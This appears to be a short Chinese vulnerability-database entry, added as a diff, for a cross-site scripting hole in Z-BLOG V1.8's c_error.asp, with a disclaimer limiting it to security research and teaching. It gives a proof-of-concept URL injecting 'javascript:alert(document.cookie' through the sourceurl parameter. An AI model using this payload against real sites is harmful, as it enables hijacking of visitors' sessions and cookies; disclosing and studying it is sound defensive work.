@@ -1,0 +1,6 @@
+Z-BLOG V1.8 c_error.asp跨站漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://www.target.com/function/c_error.asp?errorid=7&number=0&description=&source=&sourceurl=javascript:alert(document.cookie
